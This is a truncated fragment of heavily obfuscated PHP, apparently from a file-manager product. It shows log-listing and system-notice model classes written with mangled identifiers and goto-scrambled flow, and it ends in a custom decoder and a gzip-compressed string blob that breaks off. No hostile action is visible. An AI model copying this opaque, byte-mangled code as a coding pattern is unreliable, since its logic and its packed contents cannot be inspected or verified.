addLog($B±äÑ¹ËÃÈ, $aé¸É˜’ = array()) { goto dÛÔ¤Œî›‡; F¥ÈÄ›íÛË: if (!$f–×èğ) { $f–×èğ = (int) Session::get($D²¦„Çª«‚[1815]); } $EÓ•ã­ÎÕ = get_client_ip(); if (!$aé¸É˜’ || strlen(json_encode($aé¸É˜’)) >= 1024) { $aé¸É˜’ = array($D²¦„Çª«‚[2085] => $EÓ•ã­ÎÕ); } else { if (is_array($aé¸É˜’)) { $aé¸É˜’[$D²¦„Çª«‚[2085]] = $EÓ•ã­ÎÕ; } else { $aé¸É˜’ = array($D²¦„Çª«‚[1088] => $aé¸É˜’, $D²¦„Çª«‚[2085] => $EÓ•ã­ÎÕ); } } goto B´˜³ùœ”; dÛÔ¤Œî›‡: $D²¦„Çª«‚ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->typeList[$B±äÑ¹ËÃÈ])) { return; } $f–×èğ = defined($D²¦„Çª«‚[452]) && USER_ID ? USER_ID : (isset($aé¸É˜’[$D²¦„Çª«‚[1526]]) ? $aé¸É˜’[$D²¦„Çª«‚[1526]] : 0); goto F¥ÈÄ›íÛË; B´˜³ùœ”: $aé¸É˜’ = array($D²¦„Çª«‚[1517] => Session::sign(), $D²¦„Çª«‚[1518] => $f–×èğ, $D²¦„Çª«‚[29] => $B±äÑ¹ËÃÈ, $D²¦„Çª«‚[1520] => json_encode($aé¸É˜’)); parent::add($aé¸É˜’); goto B©Ç‰Îäø§; B©Ç‰Îäø§: } public function remove($dôå÷å¼ª) { $this->where(array($_SERVER[Ç³Íß¦Ó][410] => $dôå÷å¼ª))->delete(); } private function _makeOrder($f¾Ÿ ÷†à = '') { goto A ¬±š¿Ò«; A ¬±š¿Ò«: $c¿‘¿¼ë…Â =& $_SERVER[Ç³Íß¦Ó]; $C¹Å¬›íì = $c¿‘¿¼ë…Â[193]; $eêøó³–Äê = array($c¿‘¿¼ë…Â[426] => $c¿‘¿¼ë…Â[427], $c¿‘¿¼ë…Â[428] => $c¿‘¿¼ë…Â[429]); goto C¦·Ï¬š©ƒ; Fø‹Æº÷ˆö: return $this->order($f¾Ÿ ÷†à); goto F‘†Šï“…§; C¦·Ï¬š©ƒ: $d–Õ„¢­ˆÌ = Input::get($c¿‘¿¼ë…Â[434], $c¿‘¿¼ë…Â[7], $c¿‘¿¼ë…Â[1847], array($c¿‘¿¼ë…Â[1771], $c¿‘¿¼ë…Â[428])); $d–Õ„¢­ˆÌ = $eêøó³–Äê[$d–Õ„¢­ˆÌ]; $f¾Ÿ ÷†à = $f¾Ÿ ÷†à . "{$C¹Å¬›íì}\x20{$d–Õ„¢­ˆÌ}"; goto Fø‹Æº÷ˆö; F‘†Šï“…§: } public function get($c•“é ßàÎ = '') { goto D»ï‡Áˆğ; D»ï‡Áˆğ: $A¤‡À„ù =& $_SERVER[Ç³Íß¦Ó]; if (!$c•“é ßàÎ) { show_json(array()); } $e˜ùˆòù„„ = array(); goto b³í¢‰Ìèì; d÷¤Ÿäóáé: $DÕÌ¨¥ÛÆ[$A¤‡À„ù[366]] = $this->logList($DÕÌ¨¥ÛÆ[$A¤‡À„ù[366]]); return $DÕÌ¨¥ÛÆ; goto dèˆ¬‚‹™ƒ; b¯ë’¹¦Üö: if (!empty($c•“é ßàÎ[$A¤‡À„ù[2085]])) { $e˜ùˆòù„„[$A¤‡À„ù[429]] = array($A¤‡À„ù[379], "\x25{$c•“é ßàÎ[$A¤‡À„ù[2085]]}\x25"); } $DÕÌ¨¥ÛÆ = $this->_makeOrder()->where($e˜ùˆòù„„)->selectPage(); if (empty($DÕÌ¨¥ÛÆ[$A¤‡À„ù[366]])) { show_json(array(), !0, $DÕÌ¨¥ÛÆ[$A¤‡À„ù[363]]); } goto d÷¤Ÿäóáé; b³í¢‰Ìèì: if ($c•“é ßàÎ[$A¤‡À„ù[1526]]) { $e˜ùˆòù„„[$A¤‡À„ù[1526]] = $c•“é ßàÎ[$A¤‡À„ù[1526]]; } if (isset($c•“é ßàÎ[$A¤‡À„ù[722]])) { $Bèê‘áºö = $c•“é ßàÎ[$A¤‡À„ù[722]]; $FÖŠ±ƒ×ÖÑ = isset($c•“é ßàÎ[$A¤‡À„ù[474]]) ? $c•“é ßàÎ[$A¤‡À„ù[474]] : time(); $e˜ùˆòù„„[$A¤‡À„ù[193]] = array($A¤‡À„ù[330], array($Bèê‘áºö, $FÖŠ±ƒ×ÖÑ)); } if ($c•“é ßàÎ[$A¤‡À„ù[29]]) { $Bò„Ê ß  = explode($A¤‡À„ù[47], $c•“é ßàÎ[$A¤‡À„ù[29]]); $dšÀÎ™ìİ = $this->typeFile(); $DğØÔ·£ = array(); foreach ($Bò„Ê ß  as $d®Ç®ÌÄŠŠ) { $DğØÔ·£[] = $d®Ç®ÌÄŠŠ; if (isset($dšÀÎ™ìİ[$d®Ç®ÌÄŠŠ])) { $DğØÔ·£ = array_merge($DğØÔ·£, $dšÀÎ™ìİ[$d®Ç®ÌÄŠŠ]); } } $DğØÔ·£ = array_unique($DğØÔ·£); if ($DğØÔ·£) { $e˜ùˆòù„„[$A¤‡À„ù[29]] = array($A¤‡À„ù[7], $DğØÔ·£); } } else { $e˜ùˆòù„„[$A¤‡À„ù[29]] = array($A¤‡À„ù[2086], $A¤‡À„ù[2087]); } goto b¯ë’¹¦Üö; dèˆ¬‚‹™ƒ: } private function ipAddress(&$Eäô¢¡¯ÓŒ) { $Cê½‚Ê‚¼ =& $_SERVER[Ç³Íß¦Ó]; if (!empty($Eäô¢¡¯ÓŒ[$Cê½‚Ê‚¼[2085]])) { $fÓÂµ§Á”· = IpLocation::get($Eäô¢¡¯ÓŒ[$Cê½‚Ê‚¼[2085]]); } else { $fÓÂµ§Á”· = LNG($Cê½‚Ê‚¼[2088]); } $Eäô¢¡¯ÓŒ[$Cê½‚Ê‚¼[2089]] = $fÓÂµ§Á”·; } private function descZipDownload($A™–ÚÅîãº, &$C” ÆÀâÎğ) { $a––ÄË°Ê =& $_SERVER[Ç³Íß¦Ó]; if (!isset($A™–ÚÅîãº[$a––ÄË°Ê[2090]])) { return; } $cìÑ´†É²Ù = json_decode($A™–ÚÅîãº[$a––ÄË°Ê[2090]], !0); foreach ($cìÑ´†É²Ù as $bŒÛŸ«Ìµ‚) { try { $eÈ†ßÅ«™æ = IO::infoFull($bŒÛŸ«Ìµ‚[$a––ÄË°Ê[76]]); } catch (Exception $CÂÙŠÍ³à ) { continue; } $A™–ÚÅîãº[$a––ÄË°Ê[76]] = $bŒÛŸ«Ìµ‚[$a––ÄË°Ê[76]]; $C” ÆÀâÎğ[] = $A™–ÚÅîãº[$a––ÄË°Ê[394]] = $eÈ†ßÅ«™æ[$a––ÄË°Ê[394]]; $C” ÆÀâÎğ[] = $A™–ÚÅîãº[$a––ÄË°Ê[1903]] = $eÈ†ßÅ«™æ[$a––ÄË°Ê[476]]; break; } return $A™–ÚÅîãº; } private function getSourceList(&$bíß´ƒ“¥) { $DàîöÁ”ÅØ =& $_SERVER[Ç³Íß¦Ó]; $e¦Â‘ø’õ¹ = array(); foreach ($bíß´ƒ“¥ as $bÂ§Ò†‰ => $F‰å²ˆë…) { goto EˆÃ®æë‘³; EˆÃ®æë‘³: $FÍ¨Á§ø = json_decode($F‰å²ˆë…[$DàîöÁ”ÅØ[429]], !0); if ($F‰å²ˆë…[$DàîöÁ”ÅØ[29]] == $DàîöÁ”ÅØ[1660]) { $FÍ¨Á§ø = $this->descZipDownload($FÍ¨Á§ø, $e¦Â‘ø’õ¹); $bíß´ƒ“¥[$bÂ§Ò†‰][$DàîöÁ”ÅØ[429]] = json_encode($FÍ¨Á§ø); continue; } if (strpos($F‰å²ˆë…[$DàîöÁ”ÅØ[29]], $DàîöÁ”ÅØ[1904]) !== 0) { if (!isset($FÍ¨Á§ø[$DàîöÁ”ÅØ[76]]) || strpos($F‰å²ˆë…[$DàîöÁ”ÅØ[29]], $DàîöÁ”ÅØ[2091]) !== 0) { continue; } try { $D™Î†§¦Ì‹ = IO::infoFull($FÍ¨Á§ø[$DàîöÁ”ÅØ[76]]); } catch (Exception $E×†ù‹ÄŠõ) { continue; } $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[394]] = $D™Î†§¦Ì‹[$DàîöÁ”ÅØ[394]]; $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[1903]] = $D™Î†§¦Ì‹[$DàîöÁ”ÅØ[476]]; $bíß´ƒ“¥[$bÂ§Ò†‰][$DàîöÁ”ÅØ[429]] = json_encode($FÍ¨Á§ø); continue; } goto EÚà‡±ëƒù; EÚà‡±ëƒù: $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[394]]; $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[1903]]; if ($FÍ¨Á§ø[$DàîöÁ”ÅØ[29]] == $DàîöÁ”ÅØ[519]) { $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[429]][$DàîöÁ”ÅØ[1055]]; $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[429]][$DàîöÁ”ÅØ[1056]]; } goto c«ŠÀ‰î ; c«ŠÀ‰î : if ($FÍ¨Á§ø[$DàîöÁ”ÅØ[29]] == $DàîöÁ”ÅØ[1911]) { $e¦Â‘ø’õ¹[] = $FÍ¨Á§ø[$DàîöÁ”ÅØ[429]][$DàîöÁ”ÅØ[394]]; } goto AÜŸêÌğšÎ; AÜŸêÌğšÎ: } if (!$e¦Â‘ø’õ¹) { return array(); } return Model($DàîöÁ”ÅØ[791])->sourceListInfo($e¦Â‘ø’õ¹, !0); } private function logList($DÕ‡ê¸µ¦¿) { goto Dë©ö½ÌÌŠ; Dë©ö½ÌÌŠ: $CîĞÙªÙ =& $_SERVER[Ç³Íß¦Ó]; $DÜĞ”é±’Ä = array_to_keyvalue($DÕ‡ê¸µ¦¿, $CîĞÙªÙ[33], $CîĞÙªÙ[1526]); $F•“·ÛÏ¨ = Model($CîĞÙªÙ[505])->userListInfo(array_unique($DÜĞ”é±’Ä)); goto f®ó·×˜›ò; f®ó·×˜›ò: $A¹å‘«¶Ö± = $this->getSourceList($DÕ‡ê¸µ¦¿); $FŠï¤´¥¨¥ = $this->typeAll(); $d‚Öçö–¦ = array(); goto A†ÅÆ³ëè; A†ÅÆ³ëè: $CÜ¦¿ùÈ‚ö = array(); foreach ($DÕ‡ê¸µ¦¿ as $A°Ğ«”¤ÔŞ => $f‹Úñœ°É) { goto cÕÏìÉÇÁÚ; dåÀ“˜¬â: $this->ipAddress($f‹Úñœ°É); if (strpos($C ÕÔ°Àá, $CîĞÙªÙ[1904]) === 0 || isset($f‘íÙçåÊ–[$CîĞÙªÙ[1903]])) { goto A¸Š™Îí‹; B©ƒô„é³Ñ: if ($f‘íÙçåÊ–[$CîĞÙªÙ[1916]] && $f‘íÙçåÊ–[$CîĞÙªÙ[1916]][$CîĞÙªÙ[402]] == $CîĞÙªÙ[1169]) { $CÜ¦¿ùÈ‚ö[] = $f‹Úñœ°É[$CîĞÙªÙ[392]]; unset($DÕ‡ê¸µ¦¿[$A°Ğ«”¤ÔŞ]); continue; } goto cïÚ–‰«İ; A¸Š™Îí‹: $f‘íÙçåÊ–[$CîĞÙªÙ[85]] = $A¹å‘«¶Ö±[$f‘íÙçåÊ–[$CîĞÙªÙ[394]]]; $f‘íÙçåÊ–[$CîĞÙªÙ[1916]] = $A¹å‘«¶Ö±[$f‘íÙçåÊ–[$CîĞÙªÙ[1903]]]; if ($f‘íÙçåÊ–[$CîĞÙªÙ[29]] == $CîĞÙªÙ[519]) { $f‘íÙçåÊ–[$CîĞÙªÙ[429]][$CîĞÙªÙ[1055]] = $A¹å‘«¶Ö±[$f‘íÙçåÊ–[$CîĞÙªÙ[429]][$CîĞÙªÙ[1055]]]; $f‘íÙçåÊ–[$CîĞÙªÙ[429]][$CîĞÙªÙ[1056]] = $A¹å‘«¶Ö±[$f‘íÙçåÊ–[$CîĞÙªÙ[429]][$CîĞÙªÙ[1056]]]; } goto aÆÏ½ÏÇ; aÆÏ½ÏÇ: if ($f‘íÙçåÊ–[$CîĞÙªÙ[29]] == $CîĞÙªÙ[1911]) { $f‘íÙçåÊ–[$CîĞÙªÙ[429]][$CîĞÙªÙ[394]] = $A¹å‘«¶Ö±[$f‘íÙçåÊ–[$CîĞÙªÙ[429]][$CîĞÙªÙ[394]]]; } if ($f‘íÙçåÊ–[$CîĞÙªÙ[29]] == $CîĞÙªÙ[1655]) { $f‘íÙçåÊ–[$CîĞÙªÙ[1916]] = $f‘íÙçåÊ–[$CîĞÙªÙ[85]]; $f‘íÙçåÊ–[$CîĞÙªÙ[1903]] = $f‘íÙçåÊ–[$CîĞÙªÙ[1916]][$CîĞÙªÙ[394]]; $f‘íÙçåÊ–[$CîĞÙªÙ[85]] = !1; $f‘íÙçåÊ–[$CîĞÙªÙ[394]] = $CîĞÙªÙ[33]; } if ($f‘íÙçåÊ–[$CîĞÙªÙ[85]] && $f‘íÙçåÊ–[$CîĞÙªÙ[85]][$CîĞÙªÙ[402]] == $CîĞÙªÙ[1169]) { $CÜ¦¿ùÈ‚ö[] = $f‹Úñœ°É[$CîĞÙªÙ[392]]; unset($DÕ‡ê¸µ¦¿[$A°Ğ«”¤ÔŞ]); continue; } goto B©ƒô„é³Ñ; cïÚ–‰«İ: } $f‹Úñœ°É[$CîĞÙªÙ[429]] = $f‘íÙçåÊ–; goto B”¨Ùó²Ã; B”¨Ùó²Ã: unset($f‹Úñœ°É[$CîĞÙªÙ[2094]]); $d‚Öçö–¦[] = $f‹Úñœ°É; goto e¾à‹³´ƒ; DÜ”£±¹²›: $f‹Úñœ°É[$CîĞÙªÙ[1846]] = $aèèÁá‰¢; $f‘íÙçåÊ– = json_decode($f‹Úñœ°É[$CîĞÙªÙ[429]], !0); $f‹Úñœ°É[$CîĞÙªÙ[2085]] = isset($f‘íÙçåÊ–[$CîĞÙªÙ[2085]]) ? $f‘íÙçåÊ–[$CîĞÙªÙ[2085]] : $CîĞÙªÙ[33]; goto dåÀ“˜¬â; FÍä…ª…­¬: $f‹Úñœ°É[$CîĞÙªÙ[28]] = isset($aèèÁá‰¢[$CîĞÙªÙ[28]]) ? $aèèÁá‰¢[$CîĞÙªÙ[28]] : LNG($CîĞÙªÙ[2088]); $f‹Úñœ°É[$CîĞÙªÙ[1953]] = isset($aèèÁá‰¢[$CîĞÙªÙ[1953]]) ? $aèèÁá‰¢[$CîĞÙªÙ[1953]] : $CîĞÙªÙ[33]; $f‹Úñœ°É[$CîĞÙªÙ[1432]] = isset($FŠï¤´¥¨¥[$C ÕÔ°Àá]) ? $FŠï¤´¥¨¥[$C ÕÔ°Àá] : $Eêé¾åìŒ; goto DÜ”£±¹²›; cÕÏìÉÇÁÚ: $C ÕÔ°Àá = $f‹Úñœ°É[$CîĞÙªÙ[29]]; $aèèÁá‰¢ = isset($F•“·ÛÏ¨[$f‹Úñœ°É[$CîĞÙªÙ[1526]]]) ? $F•“·ÛÏ¨[$f‹Úñœ°É[$CîĞÙªÙ[1526]]] : !1; $Eêé¾åìŒ = strpos($C ÕÔ°Àá, $CîĞÙªÙ[2092]) === 0 ? LNG($CîĞÙªÙ[2093]) : LNG($CîĞÙªÙ[2088]); goto FÍä…ª…­¬; e¾à‹³´ƒ: } $this->clearSystemPathLog($CÜ¦¿ùÈ‚ö); goto eÏĞŸ»‡´; eÏĞŸ»‡´: return $d‚Öçö–¦; goto e¹°–µØ®÷; e¹°–µØ®÷: } private function clearSystemPathLog($a‚«µùš±ø) { $D¨ñ°ÉÔîå =& $_SERVER[Ç³Íß¦Ó]; if (count($a‚«µùš±ø) == 0) { return; } $Eí„ö¶‡¿À = array($D¨ñ°ÉÔîå[392] => array($D¨ñ°ÉÔîå[7], array_unique($a‚«µùš±ø))); $this->where($Eí„ö¶‡¿À)->delete(); } public function deviceList($Bßö“¿±ßÕ, $eÊÀ¢åŒ› = 0) { $C°Õ»½à =& $_SERVER[Ç³Íß¦Ó]; $dÃĞ…í«òó = array($C°Õ»½à[1526] => $Bßö“¿±ßÕ, $C°Õ»½à[193] => array($C°Õ»½à[971], $eÊÀ¢åŒ›), $C°Õ»½à[29] => $C°Õ»½à[1629]); $EŒÀĞ…•ê = array(); $cŠœÖ®›¡” = $this->field($C°Õ»½à[2095])->where($dÃĞ…í«òó)->order($C°Õ»½à[1914])->limit(50)->select(); foreach ($cŠœÖ®›¡” as $D¾ù”†õÕ => $f¬Ô„ôÛº) { goto C¦³ˆåéÁ; C†µ¶ĞÓ: $this->ipAddress($f¬Ô„ôÛº); $f¬Ô„ôÛº[$C°Õ»½à[429]] = $CÖÓÄŠÇ¿; $EŒÀĞ…•ê[$B¬•¥ò—ÛÙ] = $f¬Ô„ôÛº; goto F²ˆ‰ƒå‰‡; fëĞœÔª¨: unset($CÖÓÄŠÇ¿[$C°Õ»½à[2085]]); $B¬•¥ò—ÛÙ = $this->deviceType($CÖÓÄŠÇ¿[$C°Õ»½à[1905]]); if (isset($EŒÀĞ…•ê[$B¬•¥ò—ÛÙ])) { continue; } goto C†µ¶ĞÓ; C¦³ˆåéÁ: if ($D¾ù”†õÕ > 0 && abs($f¬Ô„ôÛº[$C°Õ»½à[193]] - $cŠœÖ®›¡”[$D¾ù”†õÕ - 1][$C°Õ»½à[193]]) < 5) { continue; } $CÖÓÄŠÇ¿ = json_decode($f¬Ô„ôÛº[$C°Õ»½à[429]], !0); $f¬Ô„ôÛº[$C°Õ»½à[2085]] = isset($CÖÓÄŠÇ¿[$C°Õ»½à[2085]]) ? $CÖÓÄŠÇ¿[$C°Õ»½à[2085]] : $C°Õ»½à[33]; goto fëĞœÔª¨; F²ˆ‰ƒå‰‡: } return array_values($EŒÀĞ…•ê); } public function deviceType($eµêùóŒ‘ç) { return $eµêùóŒ‘ç; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x6e\157\x74\151\143\145\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x63\157\x6e\164\145\x6e\x74", "\x61\x75\x74\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\x65", "\x74\x79\160\145", "\154\145\x76\145\154", "\145\x6e\x61\142\154\x65", "\163\157\162\164"); public function listData($bãöòÈ¥™– = false, $BÓÃš…ˆŠŸ = "\x73\157\162\x74", $b ¾ß¯´¢å = false) { return parent::listData($bãöòÈ¥™–, $BÓÃš…ˆŠŸ, $b ¾ß¯´¢å); } public function add($Cœ••Æ¬¬) { $EÚ‚ù™™Ñ³ =& $_SERVER[Ç³Íß¦Ó]; $DÎİ¼·‚·• = time(); if ($Cœ••Æ¬¬[$EÚ‚ù™™Ñ³[12]] == $EÚ‚ù™™Ñ³[2096]) { $DÎİ¼·‚·• = strtotime($Cœ••Æ¬¬[$EÚ‚ù™™Ñ³[196]]); } $Cœ••Æ¬¬[$EÚ‚ù™™Ñ³[196]] = $DÎİ¼·‚·•; return parent::insert($Cœ••Æ¬¬); } public function update($DØ†ìÚ‰ÍÀ, $d–¬ÔÌëá) { goto b•°›ëì‹ˆ; DßµÑ–™ä: $cÔ­àï¡ŒÃ = time(); if ($d–¬ÔÌëá[$bõùƒíÑ¦•[12]] == $bõùƒíÑ¦•[2096]) { $cÔ­àï¡ŒÃ = strtotime($d–¬ÔÌëá[$bõùƒíÑ¦•[196]]); } $d–¬ÔÌëá[$bõùƒíÑ¦•[196]] = $cÔ­àï¡ŒÃ; goto cŠÔì¡Š¨”; b•°›ëì‹ˆ: $bõùƒíÑ¦• =& $_SERVER[Ç³Íß¦Ó]; $dìÎ„¥«· = $this->listData($DØ†ìÚ‰ÍÀ); if (!$dìÎ„¥«·) { return !1; } goto DßµÑ–™ä; cŠÔì¡Š¨”: return parent::update($DØ†ìÚ‰ÍÀ, $d–¬ÔÌëá); goto cÌ¹¸šë‰ ; cÌ¹¸šë‰ : } public function remove($EŸîÂù´—’) { $BÀ‹äæ = $this->listData($EŸîÂù´—’); if (!$BÀ‹äæ || $BÀ‹äæ[$_SERVER[Ç³Íß¦Ó][1169]]) { return !1; } return parent::remove($EŸîÂù´—’); } public function sort($Då³…èÔÈÚ, $aô¤¡â¡ƒ) { return parent::update($Då³…èÔÈÚ, $aô¤¡â¡ƒ); } public function enable($BÆ‚¢Ğ†°, $fÆŒŒ«¦) { return parent::update($BÆ‚¢Ğ†°, array($_SERVER[Ç³Íß¦Ó][2097] => $fÆŒŒ«¦)); } private function initUserOption() { $Cø‚Ûë¥²® =& $_SERVER[Ç³Íß¦Ó]; $this->optionType = $Cø‚Ûë¥²®[2098]; $this->modelType = $Cø‚Ûë¥²®[2099]; $this->field = array($Cø‚Ûë¥²®[2100], $Cø‚Ûë¥²®[28], $Cø‚Ûë¥²®[196], $Cø‚Ûë¥²®[29], $Cø‚Ûë¥²®[2101], $Cø‚Ûë¥²®[714], $Cø‚Ûë¥²®[189]); } public function userNoticeGet($d£‡Áàòˆ· = false) { $this->initUserOption(); return parent::listData($d£‡Áàòˆ·, $_SERVER[Ç³Íß¦Ó][392], !0); } public function userNoticeAdd($dª£µá¿óŠ) { $c¦Ô”Ï²¶Ë =& $_SERVER[Ç³Íß¦Ó]; $this->initUserOption(); $D÷µ–İÄê½ = $this->findByKey($c¦Ô”Ï²¶Ë[2100], $dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[392]]); if ($D÷µ–İÄê½) { return !0; } $B•‹¸Ú˜­â = array($c¦Ô”Ï²¶Ë[2100] => $dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[392]], $c¦Ô”Ï²¶Ë[28] => $dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[28]], $c¦Ô”Ï²¶Ë[196] => $dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[196]], $c¦Ô”Ï²¶Ë[29] => isset($dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[29]]) ? $dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[29]] : 1, $c¦Ô”Ï²¶Ë[2101] => isset($dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[2101]]) ? $dª£µá¿óŠ[$c¦Ô”Ï²¶Ë[2101]] : 0, $c¦Ô”Ï²¶Ë[714] => 0, $c¦Ô”Ï²¶Ë[189] => 0); return parent::insert($B•‹¸Ú˜­â); } public function userNoticeEdit($a ò—±§¢Í, $bÌ¸ãİÅ) { $this->initUserOption(); return parent::update($a ò—±§¢Í, $bÌ¸ãİÅ); } } goto d›Ùœ¤ëŸ; f»¸ÅƒğÍ™: if (!function_exists('_kodDe')) { function _kodDe($eÚƒªŒ‰ä) { $eÚƒªŒ‰ä = base64_decode($eÚƒªŒ‰ä); $E†Ìäòá·ç = strlen($eÚƒªŒ‰ä); $cÁªÊî‡µ‡ = ''; $BÔåèó ÃŞ = ord($eÚƒªŒ‰ä[0]) - 30; for ($bÈ´»…í´ = 1; $bÈ´»…í´ < $E†Ìäòá·ç; $bÈ´»…í´ += 2) { if ($bÈ´»…í´ + 1 < $E†Ìäòá·ç) { $cÁªÊî‡µ‡ .= chr(ord($eÚƒªŒ‰ä[$bÈ´»…í´ + 1]) + $BÔåèó ÃŞ); $cÁªÊî‡µ‡ .= chr(ord($eÚƒªŒ‰ä[$bÈ´»…í´]) + $BÔåèó ÃŞ); } else { $cÁªÊî‡µ‡ .= chr(ord($eÚƒªŒ‰ä[$bÈ´»…í´]) + $BÔåèó ÃŞ); } } return $cÁªÊî‡µ‡; } } define(base64_decode('x7PN36bTgQ=='), "\xd7\xbf\xa0\xe3"); $_SERVER[Ç³Íß¦Ó] = explode("\x7c\x2\x7c\x5\x7c\x2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\24\105\366\260\353\212\7\253\256\367\252\353\321\144\5\162\314\221\0\11\20\10\70\311\114\222\201\111\46\314\114\10"."\110\140\350\231\351\144\72\231\231\236\164\367\344\2\157\327\203\313\13\57\324\365\217\256\347\256\210\254\272\202\342\175\255\254\202\53\170\254\42\212\2\212\350\212\272\210"."\x8b\xe8\x57\x77\x55\xf7\x4c\xdc\xff\xf7\xfb\x3e\x7e\xc0\x74\xbd\xba\xab\x5e\xbd\x7a\xef\xd5\xab\x57\x7\xd6\xbd\xb7\xf0\xd0\x85\xc3\x16\x1e\x7a\xe3\x96\xd7\xbf\x7d\xf7\x89\x4d\x38\xb0".base64_decode('8BcLf4l+wb+zFx95CPrzy8WLiosbq4aXNR999SMPyn+WV8lLg4ENf/cf8/qfpw==')."\xf9\x76\xde\xb5\x61\x60\xe7\x2f\xe\xb9\x7c\xde\xdd\x1f\x57\x83\xc4\x38\x6f\x35\xfe\x91\x32\x9a\x29\x29\xfd\xaa\x61\x1a\x18\x10\xd7\x32\x1d\x6a\x27\xfe\x56\x33\xf8\xd7\x8d\x7f\x8c\x9e"."\224\152\52\370\73\332\34\214\104\303\255\55\55\276\120\44\112\112\24\343\323\132\202\174\145\145\135\116\223\302\263\212\156\200\252\304\342\242\131\55\253\144\54\20\16\110"."\xc8\xa6\x1c\x93\xd\x52\x92\xb7\x36\xea\xf5\xb5\x4\x82\xb3\xa3\x91\xd9\x2d\x3e\x92\x22\x16\xed\xc9\x29\xfa\x0\xe\xa1\xcf\xb0\x29\xeb\x66\x44\x4d\x2b\x2c\x45\x9f\xce\xda\x55\xeb\x6b"."\360\67\113\221\220\247\71\354\251\213\370\203\315\30\134\27\154\152\362\107\362\341\241\140\40\120\353\251\233\236\37\323\22\362\64\64\171\44\320\276\224\22\125\63\35\132"."\261\64\37\307\314\227\112\360\107\275\252\244\22\370\63\43\323\346\230\3\131\362\25\141\137\140\16\62\271\124\12\7\232\331\27\151\277\322\41\347\122\144\314\274\142\40".base64_decode('q6tpmXZ9ujLAoPhDzpmamonjgK/f1GUOBy2O60payZCiwr6Ary4iwWZK9aFgkw==')."\104\246\42\55\33\246\242\113\155\215\276\220\117\202\115\257\31\215\172\74\132\302\371\132\233\301\200\110\236\100\100\32\252\4\123\111\147\151\61\70\117\201\302\202\41\257".base64_decode('LyTVzpb4OMW1dFrLuEApYD5Noam+UAh/OAgGB/xw6kggWF8f9rEQ6dyMAGjJWA==')."\202\245\226\120\242\43\145\106\173\345\124\216\42\153\67\376\35\115\176\310\257\146\20\4\356\121\63\152\216\40\53\51\102\323\330\312\41\37\71\232\132\241\20\45\101\76"."\xd2\x20\xbf\x46\x16\x17\x58\x69\xbd\xf8\xb3\x66\xa\xfe\x9d\x44\x12\xc5\xa2\x30\x4e\xd1\xcd\xa8\x92\x89\x6b\x9\x35\x43\xd6\xe3\x54\xb2\xf6\x8\x6\xca\x66\xd2\xab\xab\x20\x1d\x29\x50"."\163\305\265\354\100\223\326\113\72\323\241\246\224\0\133\156\35\132\52\241\350\74\234\5\331\305\30\322\53\165\120\310\335\234\113\213\111\130\60\236\124\123\11\235\256\322".base64_decode('n0sJ6IDaMcBXo6Hl9LjiB+uF521hLakgiRTTBJ02aL9asylNToQVXehrPcgYzA==')."\231\42\60\207\222\325\153\172\332\13\350\6\251\37\254\26\265\265\100\104\67\135\57\11\141\10\135\204\336\25\317\271\330\371\343\334\71\347\202\377\112\10\361\153\47\115"."\113\52\251\124\124\351\127\310\272\112\47\52\15\332\127\267\21\123\63\156\0\301\101\177\60\232\224\215\144\123\242\62\212\162\121\232\232\120\372\135\331\144\226\54\175\266"._kodDe('LM3Mah9ZAUuZbyVX9FtAK2PoF3EGPxkNJSRIKvuWEkw5+FFK/0NIFDo1oTo8xD8=')."\x6c\xa9\xb1\x5a\xad\x36\x68\xc6\x74\x8a\x7d\xd1\xde\x31\x98\xc1\x80\x66\x3f\xc1\x98\x22\x12\x56\xfa\x4d\x32\x28\xd2\xa4\x78\x52\xd6\xc1\x74\xd5\xe4\xcc\xe\xe7\x4\x42\x5f\xb2\xd9\x94".strrev('$ABR¥ªf©Úºƒ9õ¥*ONR×SiÖpÃÇ‰æ”™ÔÃN˜©¸µ¸ËUM—').base64_decode('WO9OSCGrySIumiRBXIEEohTXRhcnS63LGaND0Z0+smiqJTAfjEDSZF7VyGqGCg==').strrev('Z¹iË¢ÙÅt !HE45*ÛAŠê«?¯­/%©Iš½&~kâğ¸“Ç)¦É-W›')."\xca\xe6\x62\x60\x64\xc8\xea\x2d\x0\xc3\xa9\xc9\xd0\x54\x4b\x71\x18\x74\x48\xe9\x9c\x61\x3a\x75\x5\x50\x29\x15\xec\x87\x64\x8e\xfd\x1d\xce\x26\xb8\xb4\x54\x25\xe1\xc\x3\x62\x4e\xc0".base64_decode('Y8vHSQBtJBqHoY2RSEvUXw/27GZftMkTqWskzTblTtrmACDRrEgKnOUESwwiVg==')."\x33\xe8\x2b\x7\xb6\x68\x7d\x8a\xe\x2a\xae\x1d\xa8\x96\xba\xb5\x44\x4c\xeb\x77\xd1\x28\x98\x38\xc\x68\x8\x4d\xc\xa7\x3b\x6b\x3a\x43\x72\xa6\x13\x8e\x4f\x6c\xc0\x54\x8\xfa\x19\xbd"."\235\326\201\16\50\231\116\63\111\63\206\175\241\231\276\120\64\34\254\217\264\171\102\76\262\132\0\226\364\323\252\140\321\51\147\110\111\200\241\217\233\64\237\234\205\243"."\x46\xd3\xc0\x85\x1\xe7\x8a\xc6\xc2\xc5\x42\xe3\x2\xfe\x6\x38\x30\x5e\xa7\x1\x12\x39\xc5\x54\xb4\xec\x80\x9a\x56\x61\xdb\x4d\x16\x83\x46\x12\xb0\x2\xd\xa4\x41\x6e\xd4\xa1\x9a\xf6"."\x64\x69\x71\x7b\xa2\xac\xc4\x9\xfe\x2f\x2d\x99\xd3\xee\x75\x95\xce